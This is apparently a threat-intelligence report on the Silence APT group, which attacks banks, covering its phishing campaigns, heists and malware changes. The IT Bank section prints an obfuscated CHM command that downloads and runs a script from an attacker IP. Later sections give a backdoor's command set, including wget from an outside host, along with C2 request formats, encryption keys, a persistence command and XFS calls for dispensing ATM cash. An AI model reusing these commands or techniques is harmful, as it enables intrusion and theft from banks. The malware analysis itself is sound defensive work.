Early on, Silence showed signs of immaturity in their TTP by making mistakes\nand copying practices from other groups. Now, Silence is one of the most active threat actors\n[targeting the financial sector. Since we released our original report, Silence: Moving into the](https://www.group-ib.ru/resources/threat-research/silence.html)\n**[darkside, the confirmed damage from Silence's operations has increased fivefold compared to the](https://www.group-ib.ru/resources/threat-research/silence.html)**\nfigures in Group-IB's initial report.\n\n\n**As of August 2019, the confirmed amount of funds stolen by Silence from June 2016 to June 2019 is at least**\n**4.2 million US dollars.**\n\n\nSilence started by targeting organizations in Russia, gradually shifting their focus to former Soviet\ncountries, and then the world. Over time, the group expanded its geography, which has attracted\nthe attention of cybersecurity researchers.\n\nThis attention has lead Silence to grow more cautious and increase their OpSec (operational\nsecurity). Silence has made a number of changes to their toolset with one goal: to complicate\ndetection by security tools. In particular, they changed their encryption alphabets, string\nencryption, and commands for the bot and the main module. In addition, the actor has completely\nrewritten TrueBot loader, the first-stage module, on which the success of the group’s entire\nattack depends. The hackers also started using Ivoke, a fileless loader, and EDA agent, both\nwritten in PowerShell. Silence has also made a move to including fileless modules in their arsenal,\nalbeit much later than other APT groups, suggesting that the group is still playing catch-up\ncompared to other cybercriminal groups.\n\nGroup-IB analysts have identified similarities between Silence.Downloader and FlawedAmmyy.\nDownloader, which is believed to be linked to attacks by TA505. Both of these programs seem to\nhave been developed by the same individual.\n\n**[Silence 2.0: Going Global is an extension of our original report: Silence: Moving into the](https://www.group-ib.ru/resources/threat-research/silence.html)**\n**[Darkside which remains the most significant contribution to the research on the group](https://www.group-ib.ru/resources/threat-research/silence.html)**\nand is the first such report to reveal Silence’s activity. Our new report encompasses events\nthat occurred between May 2018 and 1 August 2019 and contains a comprehensive description\nof modern TTP.\n\nTo help with proper attribution and prevent new incidents this report contains sections\nfor technical specialists and analysts to help study the Tactics, Techniques and Procedures (TTP)\nand tools employed by Silence. Suricata, YARA and other detailed technical information is only\navailable to Group-IB Threat Intelligence customers.\n\n\n**Silence is still playing catch-up: they are adopting the approaches of other groups, all the while modifying older**\n**tools and trying out new ones.**\n\n\n-----\n\n###### SILENCE 2.0\n\nGoing global\n\n# EXPANDED  ATTACK GEOGRAPHY\n\n\n-----\n\n### ATTACK PREPARATION\n\nLike the majority of APT groups, Silence uses phishing as their infection vector. Now, however,\ntheir campaigns are carried out in two stages. In 2018, Silence conducted test campaigns\nto update their database of current targets and expand their attack geography. The threat actor’s\nemails usually contain a picture or a link without a malicious payload and are sent out to a huge\nrecipient database of up to 85,000 users.\n\n\n-----\n\n-----\n\n###### Recon Campaigns in Russia and the former Soviet Union\n\nRecon campaigns carried out in Russia and the former Soviet Union were also as large. From\n**16 October 2018 to 1 January 2019, Silence sent out about 84,000 emails in Russia alone**\nto update their address database. In the former Soviet Union, the attackers targeted banks\nin Kyrgyzstan, Kazakhstan, and Ukraine.\n\n###### European Recon Campaigns\n\nSilence’s European Recon campaign involved the smallest number of email addresses. On October\n18th, 2018, the group sent out emails to British financial companies as part of their preparatory\ncampaign. In total, less than 10,000 emails without malicious contents were sent to recipients\nin UK banks.\n\n\n-----\n\n-----\n\nWith the important exception of the above-mentioned recon emails, Silence’s tactics have\nremained largely the same. As part of their phishing campaigns, the group still uses Microsoft\nOffice documents with macros or exploits, CHM files, and .LNK shortcuts as malicious\nattachments.\n\nIf the initial infection is successful, a primary loader called Silence.Downloader (aka TrueBot)\nis installed on the system. In 2019, Group-IB also observed the use of a new fileless PowerShell\nloader called Ivoke. Primary loaders are designed to collect information about an infected system\nand send it to an intermediate CnC server. The operators of such servers then decide whether\nto send a command to load the next stage manually. The primary loader receives a link to the\nnext stage in the form of a command and launches it. The primary loader used by Silence has\nsignificantly evolved and is described in detail in the Changes in Tools section.\n\nThe Silence.Main Trojan, which is the main stage of the attack, has a full set of commands\nto control a compromised computer. As the CnC server, the attackers use CnC-3 server running\nWindows, from which they send commands to download additional modules. The main Trojan has\nbeen modified as well and the changes are described in detail in the Changes in Tools section.\n\nIn recent attacks, Silence has started to download a PowerShell agent that is based on the opensource projects Empire (https://github.com/EmpireProject/Empire) and dnscat2 (https://github.\ncom/lukebaggett/dnscat2-powershell/blob/master/dnscat2.ps1). In the chart, the CnC server\nof this program is designated CnC-4. The new Trojan, which we have dubbed EmpireDNSAgent\n**or simply EDA, is described in the Changes in Tools section.**\n\nIn addition, the group downloads the reverse proxy programs Silence.ProxyBot and Silence.\n[ProxyBot.NET, which are described in detail in the report Silence: moving into the darkside.](https://www.group-ib.ru/resources/threat-research/silence.html)\nBoth of these programs also use the same CnC-3 server as the backconnect server. No significant\nchanges have been made to these programs, which is why they are not described in this report.\n\nThe group continues to use winexe, sdelete, and Farse for lateral movement across networks.\n[For more details about these tools, refer to Silence: moving into the darkside.](https://www.group-ib.ru/resources/threat-research/silence.html)\n\nTo control ATMs, the group uses the Atmosphere Trojan, which is unique to Silence, or a program\ncalled xfs-disp.exe. No significant changes have been made to Atmosphere. For more details\n[about it, please refer to Silence: moving into the darkside. xfs-disp.exe is described in the](https://www.group-ib.ru/resources/threat-research/silence.html)\n**Changes in Tools section.**\n\n\n-----\n\n### ATTACK TIMELINE:  FROM RUSSIA TO LATIN AMERICA\n\nThis report covers events from May 2018 through 1 August 2019. During this time, Silence\nincreased their attack frequency. The arrests of their money mules in Bangladesh did not slow\nthe group down, and the hackers continued to expand their geography.\n\n- **\u000728 May 2018 – Group-IB specialists tracked a massive mailout of emails containing**\na malicious Microsoft Word attachment titled “Договор.doc” [Contract.doc]. The malicious\nemail was drafted in Russian. Analysis of the emails has shown that the attachment contains\nan exploit for the CVE-2017-11882 vulnerability. The exploit installs Silence’s loader, designed\nto download backdoors and other malicious programs.\n\n- **August 2018 – A bank in India was successfully attacked.**\n\n- **16 October 2018 – Silence conducted a malicious campaign targeting Russian banks, with**\nthe emails sent from info@bankuco.com.\n\n- **18 October 2018 – Silence launched a test mailout targeting financial companies in the UK.**\n\n- **18 October 2018 (same day) – Silence sent emails to Russian banks. The attackers managed**\nto conduct this campaign while impersonating a real bank due to the lack of SPF settings\non the side of the financial institution in question.\n\n- **25 October 2018 – Silence sent out emails to Russian banks. As before, the messages**\nwere sent from info@bankuco.com. The text referred to the opening and maintenance\nof a correspondent account and was sent under the name of a non-existent bank.\n\n- **15 and 16 November 2018 – Silence conducted a massive phishing campaign posing as**\nthe Central Bank of the Russian Federation. Needless to say, the Central Bank had nothing\nto do with this mailout. Group-IB specialists have established that the aim of the attack was\nto deliver and launch the second stage of Silence’s Trojan, known as Silence.MainModule.\n\n- **20 November 2018 – Silence conducted the first stage of their Asian campaign, organising**\na massive phishing attack aimed at receiving an up-to-date list of current recipients\nin different countries for further targeted attacks delivering their malicious software.\n\n- **25 and 27 December 2018 – A new malicious mailout from Silence was carried out. It was**\ncarried out from the pharmkx[.]group and cardisprom[.]ru domains. In the first case, the email\ncontained two files: “Макет дизайна дебетовой карты.doc”[Debit card design layout.doc]\nand “Макет дизайна дебетовой карты.zip” [Debit card design layout.zip].\n\n- **4 January 2019 – Silence attacked financial organisations in the UK. The distributed file was**\nsigned with a valid signature of SEVA MEDICAL LTD, a UK medical company.\n\n- **16 January 2019 – For the first time in their history, Silence disguised a malicious attachment**\n\n\n-----\n\nas an invitation to the international financial forum iFin-2019. The email had a ZIP-archive\nattached, which contained an invitation to the banking forum and the Silence.Downloader\n(TrueBot) malware.\n\n- **February 2019 – Silence successfully attacked another Indian bank.**\n\n- **February 2019 (same month) – Silence successfully withdrew money from Omsk IT Bank**\nin Russia. According to public sources, the amount of stolen funds was 25 million roubles\n(around 400,000 US dollars).\n\n- **21 May 2019 – Emails were sent out purporting to be from a bank’s client with a request**\nto block a card. It was the first time Silence used the Ivoke backdoor, a completely fileless\nTrojan, in their attacks.\n\n- **31 May 2019 – Seven men wearing masks withdrew cash from the ATMs of Dutch-Bangla**\nBank in Bangladesh. According to open sources, the group stole about $3 million.\n\n- **6 June 2019 – Silence configured a new server for their attacks.**\n\n- **20 June 2019 – The group conducted a new attack on banks in Russia.**\n\n- **July 2019 – Banks in Chile, Bulgaria, Costa Rica and Ghana were successfully attacked.**\nThe attackers used the server deployed on 6 June 2019 to control compromised workstations\nin these banks. A new Trojan named EDA (Empire DNS agent), which is based on the Empire\nand dnscat2 projects, was detected in the attacks.\n\n\n-----\n\n-----\n\n### ATTACK ON DUTCH-BANGLA BANK\n\nOn 24 March 2019, Silence.ProxyBot (MD5 2fe01a04d6beef14555b2cf9a717615c) was uploaded\nto VirusTotal from an IP address in Sri Lanka. The backconnect address for the program was\n185.20.187[.]89. Later, the main Silence backdoor (MD5 fd133e977471a76de8a22ccb0d9815b2)\nwas uploaded; it used the same address for the CnC server.\n\nGroup-IB experts established that the server 185.20.187.89 started functioning no later\nthan 28 January 2019. Communication with the IP addresses which belonged to DutchBangla’s infrastructure started no later than 16 February 2019. It is worth emphasising that\ncommunication with the main backend occurs only if the Silence.MainModule main backdoor\nis successfully installed by the operator. This excludes the possibility that connections to the\nmain backend are performed from sandboxes (a class of anti-APT solutions designed to analyse\nmalicious files in an isolated environment).\n\nAccording to local media[1], on 31 May 2019, at 23:30 local time, unidentified individuals wearing\nmedical masks started withdrawing money from the ATMs of Dutch-Bangla Bank. According\nto the local media reports, money mules (individuals engaged by hacker groups to withdraw\nmoney from ATMs) have used Dutch-Bangla Bank cards for illegitimate cash withdrawals twice.\nIn the first incident, they used them outside of Bangladesh, according to the media reports.\n\nIn the second incident, reported by the media, money was stolen from a Dutch-Bangla\nATM in Dhaka, which was recorded by CCTV cameras. The video[2] is available on YouTube.\nIt is interesting to note that the cash withdrawal occurred in the presence of an ATM security\nguard. The recording shows the faces of the mules. According to local media reports, in 2019\nSilence successfully withdrew money from the Bangladeshi bank twice within 2 months.\n\n*Picture: https://en.prothomalo.com/bangladesh/news/196691/Six-foreign-citizens-detained-in-never-seen-before\n\n\n-----\n\nThanks to the fact that the final stage of the attack (cash withdrawal by money mules) was\nrecorded on video, the local police were able to quickly detain the suspects. As reported\nby the media, they turned out to be six Ukrainian citizens:\n\n\n\n- Dennis Vitomeski, 20\n\n- Nazari Vojnok, 19\n\n- Valentine Sokolovski, 37\n\n\n\n- Sergei Ukrainetz, 33\n\n- Oleg Shevchuk, 46\n\n- Valodimir Trushiniski, 37\n\n\nAs media reports suggest, only one suspect, a 31-year-old man, managed to escape [[3] [4] [5] [6]].\nAccording to law enforcement reports, the money mules arrived in Bangladesh from Turkey\non 30 May 2019 and were going to fly from the country to India on 6 June 2019.\n\n###### Dutch-Bangla Bank: two attack vectors\n\nAccording to the official statement by Abul Kashem Mohammad Shirin, Chief Executive Officer,\nMD & Director at Dutch-Bangla Bank, the money withdrawal took place from ATMs but did not\nleave any traces of transactions in the bank’s systems. This suggests that a third party may have\ncontrolled the ATM dispenser remotely.\n\n**First vector: attack on ATMs. The CCTV footage shows that the money mules making phone**\ncalls before withdrawing money. After each call, a third party sent a command to dispense money\nto the mules. To do this, the actor may have used a unique tool called Atmosphere, a Trojan\ndeveloped by Silence to remotely control ATM dispensers, or a similar program called xfs-disp.\nexe, which the actor may have used in their attack on IT Bank. Throughout the group’s observed\nactivity, the Atmosphere Trojan has been modified to meet Silence’s requirements. In the vast\nmajority of their attacks, the group has used this particular well-developed tool for the purpose\nof theft.\n\n**Second vector: attack on card processing. After the high-profile incident in Bangladesh, a number**\nof media outlets reported that funds were also stolen from Dutch-Bangla ATMs in Cyprus,\nRussia and Ukraine. This indicates that attacks may have been carried out by compromising card\nprocessing.\n\n[As we described in Silence: Moving into the darkside report, Silence has experience with](https://www.group-ib.ru/resources/threat-research/silence.html)\ntheft using compromised card processing systems. In such cases, the hackers are capable\nof withdrawing much larger amounts, with more security ensured for the money mules. However,\nif the attackers had used this method of stealing money from Dutch-Bangla Bank, the mules\nwould not have had to fly to Bangladesh and make calls to a third person. This means that either\nthe information about cash withdrawals in other countries might be incorrect, the same bank was\nalso attacked by another hacker group, or Silence used both methods in this incident.\n\nIn any of these scenarios, the number of withdrawals, as well as the amount of stolen money, may\nbe much larger. At the moment, the confirmed damage from this attack as reported by local media\nis around $3 million.\n\n\n-----\n\n### ATTACK ON IT BANK\n\n\n-----\n\nOnce the CHM file is opened, the cmd.exe command interpreter is launched with the parameter:\n\n\nС:\\Windows\\System32\\cmd.exe /c copy C:\\Windows\\Syste%ALLUSERSPROFILE:~9,1%32\\cmd.exe \"%appdata%/\ndmw.exe\" /Y && echo 3 >> \"%appdata%/dmw.exe\" && \"%appdata%\\dmw.exe\" /c start %ALLUSERSPROFILE:~\n9,1%sht%ALLUSERSPROFILE:~8,1% \"http://185.70.186[.]146/%ALLUSERSPROFILE:~4,4%.php\"\n\n\nAs a result, a VB script called rogr.php (MD5 14732e82a6cbd108c40540314b029ee3) will\nbe downloaded from http://185.70.186[.]146/rogr.php and executed.\n\nOnce launched, the VB script rogr.php performs the following actions:\n\n1. Creates a directory %APPDATA%\\[knytaqojwv]{6}\n\n2. Drops the “certificate” http://185.70.186[.]146/nc-bank.crt named %APPDATA%\\\n\n[knytaqojwv]{6}\\[knytaqojwv]{6}.tmp to the created directory\n\n3. Decodes base64-encoded contents of the “certificate” %APPDATA%\\[knytaqojwv]{6}\\\n\n[knytaqojwv]{6}.tmp and saves them to %APPDATA%\\[knytaqojwv]{6}\\[knytaqojwv]{6}2.tmp,\nwhich also imitates a certificate\n\n\n-----\n\nGroup-IB specialists determined that the email addresses of IT bank employees were among\nthe recipients of these emails. This suggests that these emails were likely used as an entry point\nfor the attack.\n\nOn 25 February 2019, the program xfs-test.exe, which was compiled on 10 February 2019, was\nmanually uploaded to VirusTotal from a Russian IP address using the web interface. This program\nis designed to send commands directly to ATM dispensers, which results in all available cash being\ndispensed. The program contains a path to the debug information C:\\_bkittest\\dispenser\\Release_\nnoToken\\dispenserXFS.pdb. The folder name bkittest could be an abbreviation of “Bank IT test”,\nand links the file with the attack on IT Bank.\n\nTwo days after the compilation, information about the theft from IT Bank's ATMs appeared\nin the media. As a result of this attack, the bank lost about $400,000.\n\n\n-----\n\n### CHANGES IN TOOLS\n\n[The report titled Silence: Moving into the Darkside, which was released in 2018, provided](https://www.group-ib.ru/resources/threat-research/silence.html)\na detailed analysis of the entire toolset used by the Silence group. This section describes the\ndynamics of changes in the toolset after May 2018: some programs have remained the same,\nwhile others have been modified to bypass security systems more successfully. In addition, new\ntools have appeared.\n\n**New tools:**\n\n1. \u0007The Ivoke loader, written in PowerShell, is the first fileless module used by Silence.\nIt is interesting to note that they started using fileless tools later than other groups.\nThis confirms that Silence has spent their evolution “catching up”: they first studied the\napproaches of other groups, and then customised them.\n\n2. \u0007EDA is a PowerShell agent based on the Empire and dnscat2 projects. The program\nis designed to control compromised systems by performing tasks through the command shell\nand tunneling traffic using the DNS protocol. This program was first discovered in March\n2019.\n\n3. \u0007xfs-disp.exe is a Trojan for attacking ATMs, which was allegedly used in the attack on IT Bank.\n\n**Changes:**\n\n1. The execution logic of Silence.Downloader and Silence.Main, as well as the commands\nexecuted by bots, have changed.\n\n2. Encryption has been added to the Silence.Downloader loader.\n\n3. The communication protocol between the CnC server and Silence.Main has been changed.\n\n```\nLink between Silence.Downloader and FlawedAmmyy\n\n```\nA comparative analysis of Silence.Downloader and the FlawedAmmyy loader revealed that these\nprograms were developed by the same person.\n\nIt is important to note, however, that a link between Silence and attacks using FlawedAmmyy\nhas not been confrmed: the infrastructure and the techniques of the attacks in these cases i\ndiffer greatly.\n\nThe FlawedAmmyy.Downloader has been observed in attacks on different targets in various\nregions. Some researchers emphasise that the TA505 group also uses this tool to conduct their\noperations.\n\n\nThe tools that have remained the same are ProxyBot, ProxyBot.NET, and Atmosphere.\n\n\n-----\n\n###### Downloader aka TrueBot\n\nThe main goal of Silence.Downloader is to receive an executable file and run it on an infected\nmachine. The web address at which the executable file is located is sent by the CnC server\nfollowing a manual command from the operator, which means it cannot be obtained from\na sandbox.\n\nThe first sample of Silence.Downloader was detected in August 2017\n(SHA1 2ee8ee6d8ca6e815d654bb96952861f3704e82e9). The new version of the loader\n(SHA1 974f24e8f87e6a9cce7c6873954ecab50ffa6f92) was discovered in Q3 2018.\nIts functionality was significantly modified in order to more effectively bypass sandboxes\nand network security solutions:\n\n- Removed mutex creation;\n\n- Changed the list of drive letters for generating bot ID;\n\n- Changed the algorithm for generating the identifier of an infected machine;\n\n- Added features for collecting and transferring data about an infected machine;\n\n- \u0007Added data encryption. Communication with the CnC server is encrypted, but not\ncompletely. Information about the infected machine is transmitted in clear text;\n\n- Changed the paths for saving files;\n\n- Changed the algorithms for generating file names;\n\n- Changed the URLs for sending requests;\n\n- \u0007Changed the list of supported commands. The new version only supports downloading\nand running executable files.\n\nLike previous versions, Silence.Downloader contains a large number of function calls that\ndo not affect the program’s control flow. The application starts operating with a delay of 2.5\nseconds. Following this, it attempts to open the %APPDATA%\\temps.dat file.\n\nShould the file in question be absent in the file system, information about the infected machine\nwill be collected. The necessary information is gathered by executing commands in the cmd.\nexe command line interpreter. The output is forwarded to a file located in the following path:\n%APPDATA%\\temps.dat.\n\n**A list of system information collected:**\n\n1. List of running processes\n\n2. Information about current remote desktop sessions\n\n3. Information about network adapters (IP address, subnet mask, gateway address)\n\n4. Computer name\n\n5. Infected machine ID\n\n\n-----\n\nAn example of commands used to collect information of interest is presented below:\n\n\ncmd /C tasklist >> %APPDATA%\\temps.dat\n\ncmd /C qwinsta >> %APPDATA%\\temps.dat\n\ncmd /C ipconfig >> %APPDATA%\\temps.dat\n\ncmd /C hostname >> %APPDATA%\\temps.dat\n\n\nMachine ID is calculated based on the serial number of one of the disk partitions (the first\npartition that it will be able to receive): \"C\", \"D\", \"E\", \"F\", or \"Z\". If there are no partitions with the\nabove-mentioned letters on the infected computer, the constant 0x9A449F is used as a serial\nnumber. To calculate the ID, the application adds the serial number to the integer constant\n0x862937.\n\nCollected information is transmitted using a POST request to the address 185.70.186[.]149/\ndns_check/logs/logpc.php. Data about the infected machine is transferred in plain text. The\nPOST requests have the following format:\n\n\n-----\n\nIn the event that the file %AppData%\\temps.dat is present in the file system, the application copies\nitself to the startup folder. This is performed by executing a command in the cmd.exe command line\ninterpreter. The command text is encrypted using the PikeJaXyzeUawuma key (the decryption\nalgorithm is BASE64 → URL → RC4 → URL) . After decrypting the data, the following command will\nbe available:\n\n\n/C REG ADD \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"WinNetwork Security\"\n/t REG_SZ /d \"%s\" /f\n\n\nEnsuring persistence in the system depends on the availability of the process avp.exe. If this\nprocess is absent from the system, the application will copy itself (provided there is no file)\nto the path % PROGRAMDATA%\\svconhost.exe. and delete the alternative data stream in the\npath %PROGRAMDATA%\\svconhost.exe:Zone. Identifier. If the process in question is present,\nthe application will add the current location to autostart.\n\nOnce the information about the infected system has been collected or the attacker has ensured\npersistence in the system, the application switches to a standby mode, waiting for further\ncommands. To do this, it creates a GET request, in which the following data is transferred: infected\nmachine ID, operating system version and bitness. Once the required data is received, the following\nstring will be generated:\n\n\nn=<botid>&o=<OS_VERSION>&a=<PROC_ARCH>\n\n\nA description of the parameters passed is presented below:\n\n- The botid parameter is the infected machine ID\n\n- The OS_VERSION parameter has one of the following values:\n\n\n\n- UNKN\n\n- 2000\n\n- XP\n\n- S2003\n\n- VISTA\n\n- S2008R2\n\n\n\n- S2008\n\n- WIN7\n\n- WIN8\n\n- WIN81\n\n- WIN10\n\n\n\n- The PROC_ARCH parameter takes one of the following values:\n\n    - 64    - 32\n\n\n-----\n\nThe generated string is encrypted using the key FKh23yu7T*&^@# and sent to the address\n185.70.186[.]149/dns_check/dns.php?dns=<ENC_STR>. The data encryption algorithm\nis URL → RC4 → URL → BASE64.\n\nThe program sends the above-mentioned request to the server with an interval of 2 minutes.\nIn response, the server will send a command. The key used for decryption is FKh23yu7T*&^@#.\nProcessing messages from the server begins only if the message is longer than 10 characters.\n\nIf the decrypted string starts with \"http://\", the payload will be loaded from the server. The\nreceived content is saved to a file called %APPDATA%\\[0-9a-f]{8}.dates. The file name, which\nis generated randomly, is a four-byte number written in hexadecimal. The Windows API function\nCoCreateGUID() generates a unique 128-bit number.\n\nThe output is written to the GUID structure. The application uses only a part of the fields in this\nstructure. As a result, the number will be calculated using the following formula: GUID.Data1 *\nGUID.Data2 - GUID.Data3 + 0xCB6. A formal definition of the GUID structure is presented\nbelow:\n\n\ntypedef struct _GUID {\n\nDWORD Data1;\n\nWORD Data2;\n\nWORD Data3;\n\nBYTE Data4[8];\n\n};\n\n\nThe received data is encrypted using the jgsi23894uhnfjusiof key. After decryption, the data\nis written to the file %APPDATA%\\ CHROME-[0-9a-f]{8}.exe. To generate four-byte numbers,\nthe CoCreateGuid() function is used too.\n\nIn this case the formula differs from the previous version and is as follows: GUID.Data1 *\nGUID.Data2 - GUID.Data3 + 0xD435. Once the data are decrypted and written to the file, the\nencrypted version of the file (%APPDATA%\\[0-9a-f]{8}.dates) will be deleted. If the decrypted file\nstarts with “MZ”, the application will launch it.\n\n###### Ivoke\n\nThe Ivoke backdoor is a completely fileless Trojan. Its main task is to collect information about the\ninfected system and load the next stage upon command from the CnC server.\n\n**On 21 May 2019, a malicious email campaign was launched. The emails purported**\nto be from a bank customer and contained a request to block a bank card. The\nmessages were used to deliver an encrypted 7z archive called Novikov.7z (SHA1\ne22d5170981b8150dd08eda9b7eca7f5317247af). The archive contains a shortcut named\nStatement_180619.docx.lnk\n(SHA1 4d0d5ecaea133dbcc603119a5271796bfe371036).\n\nThe shortcut runs MSHTA.exe, which launches the cmd.exe command interpreter. The\ncommand interpreter launches powershell.exe, downloads a remote PowerShell script located\n\n\n-----\n\nat http://193.109.69[.]5/gggm/upl/txtand executes it.\n\n\n-----\n\nThe string <OS major version number><OS minor version number><OS build number><PID>\nis used as a bot ID. Following this, every 25 seconds, the program sends POST requests to the\nCnC server to obtain the second stage:\n\n\nping|<OS major version number><OS minor version number ><OS build number><PID>\n\nExample: ping|6176011233\n\n\nIf the server responds with the string doneyyyyyyyyaa, the process will be terminated, because\nthe machine is not one which the attacker is interested in. Otherwise, the server will send\na base64-encoded response, which will be decoded, saved and executed to the directory\n%TEMP%\\<OS major version number><OS minor version number>< OS build number ><PID>.exe.\n\n###### MainModule aka Silence\n\nThis program is designed to remotely control a compromised system and is capable\nof downloading and running files from remote network nodes, executing commands in the\ncommand shell, and uploading local files to the CnC server. The following versions of the program\nwere compared:\n\n- \u0007an intermediate version (SHA1 c59cb38bcada36d8c7a671642146ff39f1f49693), discovered\nin November 2018;\n\n- \u0007the latest version (SHA1 1477b18e917c295df9b3c5624e91057999a3f2b6) used in the\nattacks in early 2019;\n\n- \u0007earlier versions of Silence.MainModule 2017 (taken into account only in the comparative\ntable at the end of the chapter).\n\n###### Description and functionality of the 2019 version\n\nSilence.MainModule is a typical remote control Trojan that provides access to the command\nshell CMD.EXE with the possibility of downloading files from remote nodes to a computer\nand uploading files from a computer to a remote server.\n\nCompared to the samples from 2017, the intermediate version had a new command added for\nsending files from a compromised system to the CnC server. At the end of 2018, the developers\nchanged the method of command spelling: they stopped using Russian words typed in the English\nlayout.\n\nNetwork communications are performed using unencrypted connections via HTTP and GET\nrequests. The first request (<request1>) is sent to the CnC server in the following format:\nhttp://<cnc>/showthread.php?yz=1.\n\n\nExample of a request: \"http://185.29.10[.]26/showthread.php?yz=1\"\n\n\n-----\n\nIn response, the CnC server sends <response1>, which, according to the debug information in the\nfile, is the identifier of the client.\n\n\nGET /showthread.php?yz=1 HTTP/1.1\n\nAccept: */*\n\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\n\nHost: 185.29.10[.]26\n\nConnection: Keep-Alive\n\n\nHTTP/1.1 200 OK\n\nContent-Type: Tex/ascii\n\nDate: Thu, 29 Nov 2018 22:23:08 GMT\n\nConnection: keep-alive\n\nTransfer-Encoding: chunked\n\n1543530188357\n\n\nThe path to the script and the names of the yz= and User-Agent parameters can change to make\nit difficult to detect communication using traffic analysis tools.\n\nFollowing this, the file sends a second request (<request2>) to the CnC. This looks as follows:\n\"http://cnc/showthread.php?yz=2&alphayz=<response1>\", where <response1> is the server’s\nresponse to <request1>.\n\n**Пример:**\n\n\nGET /showthread.php?yz=2&alphayz=1543530188357 HTTP/1.1\n\nAccept: */*\n\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\n\nHost: 185.29.10[.]26\n\nConnection: Keep-Alive\n\n\nHTTP/1.1 200 OK\n\nContent-Type: Tex/ascii\n\nDate: Thu, 29 Nov 2018 22:23:08 GMT\n\nConnection: keep-alive\n\nTransfer-Encoding: chunked\n\nloikjhu\n\n\n-----\n\nIn response, CnC sends one of the supported commands. The tables below contain lists\nof connection types and CnC commands that the malware executes.\n\n**Type of connection** **Description** **Example of client request to CnC**\n\nConnect1 Bot registration http://185.29.10[.]26/showthread.php?yz=1\n\nConnect2 Command request http://185.29.10[.]26/showthread.\nphp?yz=2&alphayz=1234567890\n\nConnect3 Sending command results http://185.29.10[.]26/showthread.\nphp?yz=2&alphayz=1234567890&betayz=aaaaabbbbccc\n\n**Command** **Type of command** **Description** **Example of use**\n\n\nnviodgs reconnect Terminate the command interpreter\nsession, clear all temporary files, connect\nto CnC \"from scratch\"\n\n\nnviodgs\n\n\ncbthds restart Terminate the command interpreter cbthds\nsession and restart it\n\nloikjhu notasks No operation loikjhu\n\n#ipsum upload Upload a specified file to CnC #ipsum c:\\some_file.exe\n\n#lorem wget Download a file from a remote server #lorem\nand save it in the current directory http://84.38.134[.]103/f.exe 1.exe\n\npower\\n shell Launch the command interpreter power\\n\n\n\\n<cmd> run Execute an arbitrary OS command using \\nipconfig\nthe command interpreter\n\n\n-----\n\nDetailed description of the commands:\n\n- \u0007The restart command restarts the command interpreter, for example if the current console\nis unresponsive.\n\n- \u0007The shell command launches a new hidden instance of the OS command interpreter, which\nwill be used to covertly launch commands on the infected machine (the last line in the table\nabove).\n\n- \u0007The wget command delivers files from remote servers to PCs. The actor can specify which\nfile to download and what name to save it under. The files are saved in the folder from which\nthe executable file of the backdoor was launched. In the new version of the file, the command\nwill not start if a string of less than 72 characters has been passed to it.\n\n- The wput command is used to send the contents of a specified local file to the CnC server.\n\nIf none of the control commands are received from the CnC, the connection can\nbe re-established right away or with a one- or ten-second delay, in a cycle.\n\nCaptured data is encoded using the coding algorithm with the native alphabet,\nAiL7aIm3BzpxbZq0CKs5cYU1Dkt-dVw.Elr9eNW_FnT8fOu4GoS,gvR6HMQ2hyPX, and is then\nsent to the CnC server.\n\nDespite the fact that the coding algorithm uses random data generation, the resulting coded data\ncan be decoded on the server by the attacker because:\n\n1. The random data generator has small entropy (it only generates digits from 0 to 3).\n\n2. \u0007The random data generator has been intentionally designed this way to ensure that random\ndata could be excluded based on the formula (since the result of multiplication will always\nbe divisible by 4, and the random numbers are always less than 4).\n\nEach character in the source data is coded into two symbols using two different arithmetic\noperations (formulas). This allows the source data to be decoded by solving a system of equations.\n\nEncryption of the command output is performed based on the following correspondence table:\n\nP 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15\n\nC AiL7 alm3 Bzpx bZq0 CKs5 cYU1 Dkt- dVw Elr9 eNW FnT8 fOu4 GoS gvR6 HMQ2 hvPX\n\nAs shown in the table, each value from the P row uniquely corresponds to a value from the\nC row. The elements in the C row are four-digit strings. Taking into account that\neach character in the alphabet AiL7aIm3BzpxbZq0CKs5cYU1Dkt-dVw.Elr9eNW_\nFnT8fOu4GoS,gvR6HMQ2hyPX belongs only to one line from the C row, you can make\na reversible transformation:\n\n**P[index] = C[index][random % 4]**\n\nLet’s consider an example: let's say you need to encrypt the character 7, hex(\"7\") = 0x37. The\nprogram splits the number into 3 and 7. First, it encodes the character 7, choosing any character\n(let it be \"V\") from the string “dVw.”. After that, it encodes the character 3, now choosing\nan encoding character from the string \"bZq0\" (let it be \"0\"). As a result, the program has encoded\nthe character \"7\" with the string \"V0\".\n\n|P C|0 AiL7|1 alm3|2 Bzpx|3 bZq0|4 CKs5|5 cYU1|6 Dkt-|7 dVw|8 Elr9|9 eNW|10 FnT8|11 fOu4|12 GoS|13 gvR6|14 HMQ2|15 hvPX|\n|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|\n\n\n-----\n\n-----\n\n###### Comparison with the 2018 version\n\nBased on the binary comparison of the two file versions using the BinDiff utility, the 68% of the\nnew version consists of code used in the old version. The new version of the file contains 349\nnew functions, only 56 of which have more than 50 instructions.\n\nThis means that the new version is a recompiled old version.

This information is displayed to the administrator\nand stored in the log.\n\n- \u0007By calling the function WFSGetInfo() with the flag dwCategory == WFS_INF_CDM_\nSTATUS the attacker receives values for the fields fwDevice, fwSafeDoor, fwDispenser,\nand fwIntermediateStacker from the _wfs_cdm_status structure to find out the current status\nof the dispenser (whether it is connected and busy), the state of the safe door, the state\nof the dispenser’s logical cash units, the state of the shutter, etc. This information is displayed\nto the administrator and stored in the log.\n\n- \u0007By calling the function WFSGetInfo() with the flag dwCategory == WFS_INF_CDM_CASH_\nUNIT_INFO, the attacker can gain information about the status and contents of ATM\ncassettes. The output is displayed as a format string Id:%s(nr=%d)(l=%d,h=%d), %d|%d|%d\nof %d [%s][%d][%d],[%d][%d]\\n, where the numbers from the output of the above-mentioned\n\n\n-----\n\n-----\n\nIf the version of the dispenser service provider is 3, the program performs the following actions:\n\n1. Sends the RESET command to CDM by calling the WFSExecute function with the flag\ndwCommand == WFS_CMD_CDM_DISPENSE\n\n2. Receives data about ATM cash units.\n\n3. Receives the maximum number of banknotes that can be withdrawn in a single operation\nusing the same method as in version 2 (described above).\n\n4. Receives the current status of the dispenser (whether it is connected and busy), the state\nof the safe door, the state of dispenser’s logical cash units, the state of the shutter, etc. 